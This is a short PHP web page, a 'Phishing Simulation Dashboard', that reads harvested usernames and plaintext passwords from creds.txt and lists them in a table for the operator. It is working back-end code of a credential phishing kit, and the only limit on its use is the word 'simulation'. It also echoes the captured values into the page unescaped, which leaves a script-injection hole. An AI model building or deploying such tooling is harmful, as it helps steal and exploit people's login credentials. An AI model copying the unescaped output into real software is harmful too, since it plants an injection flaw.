<?php
$file = "creds.txt";
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Phishing Dashboard</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f4f6f9;
      margin: 0;
      padding: 20px;
    }
    h2 {
      text-align: center;
      color: #2c3e50;
    }
    table {
      width: 80%;
      margin: 20px auto;
      border-collapse: collapse;
      background: #fff;
      box-shadow: 0px 4px 10px rgba(0,0,0,0.1);
    }
    th, td {
      border: 1px solid #ddd;
      padding: 12px;
      text-align: center;
    }
    th {
      background: #3498db;
      color: white;
    }
    tr:nth-child(even) {
      background: #f9f9f9;
    }
    .empty {
      text-align: center;
      margin-top: 30px;
      font-size: 16px;
      color: #888;
    }
  </style>
</head>
<body>
  <h2>Phishing Simulation Dashboard</h2>
  <?php
  if(file_exists($file) && filesize($file) > 0){
      $lines = file($file, FILE_IGNORE_NEW_LINES);
      echo "<table>";
      echo "<tr><th>Username</th><th>Password</th></tr>";
      foreach($lines as $line){
          // Each line is stored like "Username: X Password: Y"
          preg_match('/Username: (.*?) Password: (.*)/', $line, $matches);
          if($matches){
              echo "<tr><td>".$matches[1]."</td><td>".$matches[2]."</td></tr>";
          }
      }
      echo "</table>";
  } else {
      echo "<p class='empty'>No captured credentials yet.</p>";
  }
  ?>
</body>
</html>
